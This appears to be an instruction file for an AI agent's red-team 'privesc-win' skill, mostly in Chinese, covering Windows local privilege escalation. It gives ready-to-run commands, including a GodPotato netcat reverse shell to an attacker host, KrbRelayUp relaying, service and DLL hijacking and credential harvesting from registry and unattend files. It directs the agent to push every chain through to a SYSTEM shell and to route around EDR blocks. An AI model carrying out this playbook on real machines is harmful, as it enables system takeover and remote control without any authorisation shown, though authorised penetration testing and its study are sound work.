---
name: privesc-win
description: "Windows local privilege escalation from a low-privilege shell to Administrator or SYSTEM. Covers quiet vs loud enumeration, SeImpersonate/Potato family including LocalPotato, token privileges (SeBackup/SeRestore/SeManageVolume/SeLoadDriver/SeDebug), service/DLL/COM/scheduled-task abuse, AlwaysInstallElevated and UAC boundary, KrbRelayUp-style domain-joined local admin, and version-gated kernel LPE. Use when the operator already has a Windows foothold and needs local SYSTEM. Endpoint blocks hand off to /edr-bypass then return here."
---

# /privesc-win — Windows 本机提权

> **scope：** 已有低权限 Windows foothold，打到 **Administrator（High IL）或 `NT AUTHORITY\SYSTEM`**。不做横移、域持久化、LSASS/NTDS 凭据收割、主机持久化。▸ 拿到 SYSTEM 后记 notes，候选只认 `~/.claude/skills/shared/modules.yaml`（`modules.py tail`），由操作者选。

本模块是红队攻击模块。条件成立就打到对应权限，不要停在“发现 SeImpersonate / 服务可写”。加用户只是 holster，**SYSTEM shell 才是成功**。

工具：`../shared/tools.md`。kernel 有精确 build 才读 `../shared/cve-enrichment.md`。走到对应分支再 Read **一份**：

- Potato / LocalPotato → `references/potato-family.md`
- Token 特权 → `references/token-privileges.md`
- 服务 / DLL / COM / 计划任务 → `references/service-dll-task.md`
- Installer / UAC → `references/installer-uac.md`
- Kernel LPE 短表 → `references/kernel-lpe.md`

---

## 开局与收尾

开局第一件事：Read `./notes.md`。没有则 `python ~/.claude/skills/bin/notes.py init`。只按已拿下/凭据继续。
走到哪条链，才 Read **一份** `references/<file>.md`。禁止开局全读、禁止凭记忆写 payload。
监听 / sudo / 输密码 / Permission denied：立刻停，说明等操作者做什么，等回报。不要假装已成功。
收尾：
1. 追加 `./notes.md`
2. `python ~/.claude/skills/bin/modules.py tail <本模块名>`
   Read 备用：`~/.claude/skills/shared/modules.yaml`
   禁止 `./modules.yaml` 和 `python ../bin/...`
3. 优先 `default_next`；`never_default` 不得当作默认（操作者点名除外）
4. 名册外的名字不许建议
5. 停。等操作者选 `/模块` 或 `/clear`
`/edr-bypass` 半条链未完：打通后回本模块，不要 /clear。


---

## 0. 成功条件与攻击强度

```text
低权限 Windows shell
        ↓
本机原语成立（特权 / 可写服务 / UAC / 未打补丁 LPE）
        ↓
打到 NT AUTHORITY\SYSTEM 或 High IL 本地管理员，并且能执行命令
        ↓
/privesc-win COMPLETE
```

**成功：** `whoami` 为 `nt authority\system`，或本地 Administrators + High IL 且能按需再拿到 SYSTEM。

**不是成功：** 只输出 winPEAS 红项、只记录特权、只 `net user /add` 却没有 SYSTEM/admin shell。

UAC 绕过（Medium → High）是中途站，不是终点。High 之后继续服务/特权/kernel，直到 SYSTEM 或操作者明确收工。

---

## 0.5 Endpoint Defense Boundary — 可选 /edr-bypass Handoff

`/privesc-win` 自己拥有本机提权链直到 SYSTEM。

仍属本模块、不是 EDR：

```text
没有 SeImpersonate
UAC 完整 + 非管理员组
服务 DACL/文件 ACL 不可写
SMB/LDAP signing（KrbRelayUp 前置）
补丁已修、版本不匹配
```

只有 **提权 payload 已进入 OS 执行** 且被 AV/Defender/EDR/AMSI/WDAC/AppLocker/PPL 明确阻断时：

```text
privesc primitive confirmed
        ↓
endpoint security blocks intended action?
├─ NO  → 继续 /privesc-win 直到 SYSTEM
└─ YES → 操作者可临时选择 /edr-bypass
            ↓
         恢复当前动作的执行能力
            ↓
         返回 /privesc-win
            ↓
         拿完 SYSTEM
```

不要因为 EDR 在场就改成“只做评估、不打 Potato”。被拦再交接，解决后回来打完。

---

## 0.6 自动漏洞库

kernel / PrintNightmare / LocalPotato 等 **先指纹再查库**，禁止 `Windows 11` → dump 全部 EoP。

```text
OS Name + Version + UBR/KB
role: workstation / member / DC
Spooler / WinRM / WebClient 状态
→ ../shared/cve-enrichment.md 节 /privesc-win
→ 命中且有公开稳定利用 → references/kernel-lpe.md
```

```cmd
systeminfo
ver
wmic qfe get HotFixID,InstalledOn
```

```powershell
Get-ComputerInfo | select WindowsProductName,WindowsVersion,OsBuildNumber,OsHardwareAbstractionLayer
Get-HotFix | sort InstalledOn -Descending | select -First 25
```

无精确 build / 无公开 PoC：标 `CANDIDATE`，不编 exploit。

---

## 1. 决策树（按这个顺序打）

```text
whoami /priv /groups + 完整性级别
        ↓
A. SeImpersonate 或 SeAssignPrimaryToken = Enabled
      → Potato → SYSTEM（GodPotato/SigmaPotato 首选）
B. 无 impersonate，本机 NTLM reflection 未补
      → LocalPotato CVE-2023-21746
C. 服务/DLL/无引号路径/计划任务/COM 可写
      → 替换/劫持 → 等 SYSTEM 启动 → SYSTEM shell
D. SeBackup / SeRestore / SeManageVolume / SeLoadDriver / SeDebug / SeTakeOwnership
      → references/token-privileges.md 对应链
E. Medium IL + 本地管理员组
      → UAC 绕过到 High，再继续 A/C/D
F. AlwaysInstallElevated / 可写 MSI 修复路径
      → references/installer-uac.md
G. 域内机器、普通域用户、LDAP 可中继
      → KrbRelayUp 拿到本机 admin，再 Potato 到 SYSTEM
H. 以上都没有
      → systeminfo 指纹 → ../shared/cve-enrichment.md → references/kernel-lpe.md
```

同一条链打穿再换下一条。操作者指定模块外方向时才停。

---

## 2. 枚举：Quiet 默认，Loud 要操作者同意

### 2.1 Quiet（企业 / 有 EDR 默认）

```cmd
whoami
whoami /priv
whoami /groups
net user %username%
net localgroup administrators
hostname
echo %USERDOMAIN%\%USERNAME%
```

```powershell
whoami /priv /fo csv
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrators')
[System.Security.Principal.WindowsIdentity]::GetCurrent().Groups | ForEach-Object { $_.Translate([System.Security.Principal.NTAccount]) }
Get-Service Spooler,WinRM,WebClient -ErrorAction SilentlyContinue | format-table Name,Status,StartType
```

关注：

```text
SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege  Enabled
SeBackupPrivilege / SeRestorePrivilege / SeManageVolumePrivilege
SeLoadDriverPrivilege / SeDebugPrivilege / SeTakeOwnershipPrivilege
Mandatory Label\Medium vs High
BUILTIN\Administrators  是否在组但被 UAC 过滤
Backup Operators / Hyper-V Administrators / DNS Admins
```

服务/任务只做定向查询，不要一上来全盘 `Get-ChildItem C:\`。

### 2.2 Loud（OSCP/HTB 或操作者明确同意）

```cmd
winPEASx64.exe
```

```powershell
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
SharpUp.exe audit
```

Seatbelt 可补主机画像，不是提权本身。PowerUp 仅当 PrivescCheck/SharpUp 不可用。

winPEAS 标红 ≠ 已利用。对每一条回到决策树真正执行。

---

## 3. Token / Potato（最高频）

```cmd
whoami /priv
```

`SeImpersonatePrivilege` 在 IIS / MSSQL / 服务账户上默认常见。**Enabled 就打，不要只记笔记。**

```cmd
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "cmd /c C:\Users\Public\nc64.exe KALI 4444 -e cmd.exe"
```

成功：回连或输出 `nt authority\system`。

PrintSpoofer 仅当 Spooler 为 Running。Win10 1809+ 不要用原版 JuicyPotato。无 SeImpersonate 走 LocalPotato。

完整选择矩阵、失败换路、LocalPotato、RogueWinRM → **references/potato-family.md**

其他特权（Backup/ManageVolume/LoadDriver/Debug）→ **references/token-privileges.md**

---

## 4. 服务 / DLL / 计划任务 / COM

Quiet 定向：

```cmd
sc qc <svc>
icacls "C:\path\to\service.exe"
accesschk.exe -uwcqv %USERNAME% *
accesschk.exe -uvwqk HKLM\System\CurrentControlSet\Services
```

```powershell
Get-CimInstance Win32_Service | Where-Object { $_.StartName -match 'LocalSystem|LocalService|NetworkService' } |
  Select-Object Name,State,StartName,PathName
```

可写服务 exe、可改 `ImagePath`、无引号路径、缺 DLL、SYSTEM 计划任务工作目录可写、COM CLSID 可劫持 → 换成 payload，**等 SYSTEM 上下文执行后拿 shell**，不要停在“ACL 可写”。

完整命令 → **references/service-dll-task.md**

---

## 5. UAC 与 Installer

```cmd
whoami /groups | findstr /i "Level Administrators"
```

```text
管理员组 + Medium IL  → UAC 边界，可绕过到 High
管理员组 + High IL    → 已是本地管理员，继续拿 SYSTEM
不在管理员组          → 不要浪费时间刷 fodhelper
```

AlwaysInstallElevated 两个键都为 `0x1` 才打。UAC 不是 SYSTEM。

完整 → **references/installer-uac.md**

---

## 6. 存储凭据（仅当能直接变成 admin/SYSTEM）

```cmd
cmdkey /list
runas /savecred /user:DOMAIN\admin "cmd /c whoami"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
dir /s /b C:\unattend.xml C:\sysprep.xml C:\Windows\Panther\Unattend.xml 2>nul
```

`DefaultPassword` / unattend 出明文管理员密码 → 立刻用该身份拿 High/SYSTEM。  
`reg save HKLM\SAM` 需要 SeBackup 或已是 admin，走 **references/token-privileges.md**，不要当普通用户命令。

---

## 7. 域内本机：KrbRelayUp（本机 admin，不是 DA）

条件：机器已加域、当前是域用户、LDAP signing 未强制、可添加机器账户或有可写机器对象。

```cmd
.\KrbRelayUp.exe relay -m spawn -c powershell
```

成功 = 本机管理员 shell。然后回到第 3 节 Potato 拿 SYSTEM。  
域内身份/DA 路径还不清楚 → 候选 `/ad-recon`，本模块不展开。不要在这里直接开 `/ad-attack`。

LDAP signing required 时这条死，换其他本机路径。

---

## 8. Kernel / 本地 CVE

不要背 CVE 名单。流程：

```text
systeminfo / Get-HotFix
→ ../shared/cve-enrichment.md
→ 精确 build + 公开稳定 PoC + 非 PPL/HVCI 阻断
→ references/kernel-lpe.md 执行
```

短名单（仍要版本门）：LocalPotato、本地 PrintNightmare、MSKSSRV CVE-2023-29360、CVE-2024-30088。远程 PrintNightmare 不是本模块。

错版本 kernel exploit 会蓝屏。没有公开稳定利用的标 P2，不编命令。

---

## 9. 完成后

```text
whoami /all
hostname
ipconfig
```

记 notes：如何拿到 SYSTEM、用了哪条原语、是否需要还原服务/任务/注册表。
候选只按「开局与收尾」跑 `python ~/.claude/skills/bin/modules.py tail`。不要在这里另列名单。

还原：服务 exe 从 `.bak` 拷回、计划任务/COM/UAC 注册表恢复、LocalPotato/kernel 后重启评估。具体 → 对应 reference 的 RESTORE。
